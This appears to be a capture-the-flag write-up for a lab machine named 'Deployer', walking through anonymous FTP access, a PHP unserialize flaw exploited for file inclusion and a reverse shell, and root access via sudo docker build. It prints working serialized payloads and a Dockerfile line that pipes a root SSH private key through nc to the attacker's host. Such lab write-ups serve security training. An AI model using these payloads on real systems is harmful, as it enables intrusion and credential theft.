# Deployer

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.158
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 11:41 +08
Nmap scan report for 192.168.157.158
Host is up (0.17s latency).
Not shown: 65462 closed tcp ports (conn-refused), 70 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### FTP --> Subdomain + Source Code

FTP allows for anonymous logins:

```
$ ftp 192.168.157.158
Connected to 192.168.157.158.
220 (vsFTPd 3.0.3)
Name (192.168.157.158:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42744|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 16 03:41 bak
drwxr-xr-x    2 113      118          4096 May 11  2021 ftp
drwxr-xr-x    4 0        0            4096 May 11  2021 sec
drwxr-xr-x    8 0        0            4096 May 11  2021 site
drwxr-xr-x    5 0        0            4096 May 11  2021 web
```

The FTP access shows us quite a few subdomains that exist within the `/web` folder:

```
ftp> ls -la
229 Entering Extended Passive Mode (|||22625|)
150 Here comes the directory listing.
drwxr-xr-x    5 0        0            4096 May 11  2021 .
drwxr-xr-x    7 0        0            4096 May 11  2021 ..
drwxr-xr-x    6 33       33           4096 May 11  2021 deployer
drwxr-xr-x    3 33       33           4096 May 11  2021 dev
drwxr-xr-x    2 33       33           4096 May 11  2021 html
ftp> cd dev
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||31194|)
150 Here comes the directory listing.
drwxr-xr-x    3 33       33           4096 May 11  2021 .
drwxr-xr-x    5 0        0            4096 May 11  2021 ..
-rw-r--r--    1 33       33          21173 May 03  2021 about.php
drwxr-xr-x    6 33       33           4096 May 02  2021 assets
-rw-r--r--    1 33       33          17736 May 03  2021 contact.php
-rw-r--r--    1 33       33          32880 May 03  2021 index.php
-rw-r--r--    1 33       33             52 May 02  2021 lfi-prev.html
-rw-r--r--    1 33       33          24001 May 03  2021 pricing.php
-rw-r--r--    1 33       33          36926 May 03  2021 work-single.php
-rw-r--r--    1 33       33          23655 May 03  2021 work.php
```

The `dev` file was the most interesting because it had PHP code, whereas the others just had HTML files that were static. The `index.php` file had this:

```php
$ cat index.php  
<?php
    class Page
    {
        public $file;

        public function __wakeup()
        {
            include($this->file);
        }
    }

if (!isset($_POST['page'])){
    if (strpos(urldecode($_GET['page']),'..')!==false){
        include('/var/www/dev/lfi-prev.html');
        }
    else{
        include('/var/www/dev/'.$_GET['page']);
    }
    }
else{
    $f=$_POST['page'];
    unserialize($f);
}
?>
```

There was a deserialisation exploit here beacuse of how the `page` parameter is handled, which allows for LFI and execution of PHP files through the `include()` function. At least we know that this site is vulnerable.&#x20;

The `site` directory contained Apache config files:

```
ftp> cd site
l250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||11871|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            7224 Aug 12  2020 apache2.conf
drwxr-xr-x    2 0        0            4096 May 11  2021 conf-available
drwxr-xr-x    2 0        0            4096 May 11  2021 conf-enabled
-rw-r--r--    1 0        0            1782 Apr 13  2020 envvars
-rw-r--r--    1 0        0           31063 Apr 13  2020 magic
drwxr-xr-x    2 0        0           12288 May 11  2021 mods-available
drwxr-xr-x    2 0        0            4096 May 11  2021 mods-enabled
-rw-r--r--    1 0        0             320 Apr 13  2020 ports.conf
drwxr-xr-x    2 0        0            4096 May 11  2021 sites-available
drwxr-xr-x    2 0        0            4096 May 11  2021 sites-enabled
ftp> cd sites-enabled
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||62424|)
150 Here comes the directory listing.
lrwxrwxrwx    1 0        0              35 May 11  2021 000-default.conf -> ../sites-available/000-default.conf
-rw-r--r--    1 0        0             266 May 11  2021 000.conf
-rw-r--r--    1 0        0             323 May 11  2021 001.conf
-rw-r--r--    1 0        0             360 May 11  2021 002.conf
```

`002.conf` contained a hidden subdomain:

```
$ cat 002.conf 
<VirtualHost *:80>
AssignUserId shanah shanah
ServerAdmin webmaster@localhost
DocumentRoot /var/www/dev
ServerName und3r_dev.deployer.off
ServerAlias und3r_dev.deployer.off
<Directory "/var/www/dev">
  Options FollowSymLinks
    AllowOverride All
</Directory>
ErrorLog ${APACHE_LOG_DIR}/error.log
CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

The DocumentRoot is where the vulnerable PHP files are located, so this hidden domain is the exploitable one.

The intended path seems to be using deserialisation for LFI and maybe to execute PHP files. We are unable to write to the almost all the directories accessible through FTP except for the `ftp` one:

```
ftp> cd ftp
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||26863|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> put phpreverseshell.php
local: phpreverseshell.php remote: phpreverseshell.php
229 Entering Extended Passive Mode (|||23987|)
150 Ok to send data.
100% |************************************************|  5494       95.26 MiB/s    00:00 ETA
226 Transfer complete.
5494 bytes sent in 00:00 (15.38 KiB/s)
```

### Deserialisation --> LFI + RCE

To exploit the LFI, I used some PHP code to generate the serialised objects needed:

```php
<?php
    class Page
    {
        public $file ='../../../../../../../etc/passwd';

        public function __wakeup()
        {
            include ($this -> file);
            echo wakeup;
        }
    }
    $a=new Page();
    echo serialize($a);
?>

$ php test.php               
O:4:"Page":1:{s:4:"file";s:31:"../../../../../../../etc/passwd";}
```

We can then add the exploitable subdomain to our `/etc/hosts` file and view it:

<figure><img src="../../../.gitbook/assets/image (1954).png" alt=""><figcaption></figcaption></figure>

We can then test our PHP code and find that it works:

<figure><img src="../../../.gitbook/assets/image (1857).png" alt=""><figcaption></figcaption></figure>

Using this, we can attempt to read the FTP configuration files to find out where the FTP directory is:

<figure><img src="../../../.gitbook/assets/image (3444).png" alt=""><figcaption></figcaption></figure>

The FTP Root is at `/srv`, meaning the reverse shell I uploaded is at `/srv/ftp/phpreverseshell.php`. We can then execute it using this serialised object:

```
O:4:"Page":1:{s:4:"file";s:48:"../../../../../../../srv/ftp/phpreverseshell.php";}
```

I had to put the file there again since something cleared it, but I did get a reverse shell in the end:

<figure><img src="../../../.gitbook/assets/image (508).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

I upgraded the shell by dropping my public SSH key into the user's `authorized_keys` folder for easy access in case I lose this initial shell.

### Sudo Docker Build --> Root

The user could run `sudo` with some commands:

```
shanah@deployer:~$ sudo -l
Matching Defaults entries for shanah on deployer:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shanah may run the following commands on deployer:
    (root) NOPASSWD: /usr/bin/docker images
    (root) NOPASSWD: /usr/bin/docker build *
```

We can first view the images present:

```
shanah@deployer:~$ sudo docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d4ff818577bc   2 years ago   5.6MB
```

I read the documentation for `docker build`, and learned that we need a `Dockerfile` to run it:

{% embed url="https://docs.docker.com/engine/reference/commandline/build/" %}

The `/opt` directory also had a `id_rsa.bak` file present:

```
shanah@deployer:/opt$ ls -la
total 16
drwxrwxrwx  3 root root 4096 May 11  2021 .
drwxr-xr-x 20 root root 4096 Jan  7  2021 ..
drwx--x--x  4 root root 4096 May 11  2021 containerd
-r--------  1 root root 2602 May 11  2021 id_rsa.bak
```

I think the goal is to read this file somehow. Here's the `Dockerfile` I used:

```
FROM alpine

COPY id_rsa.bak /tmp/id_rsa.bak
RUN cat /tmp/id_rsa.bak | nc 192.168.45.196 21
```

Then, we can run `sudo /usr/bin/docker build .` within `/opt` where the `Dockerfile` is.&#x20;

<figure><img src="../../../.gitbook/assets/image (2026).png" alt=""><figcaption></figcaption></figure>

We can then `ssh` in as `root`:

![](<../../../.gitbook/assets/image (3429).png>)
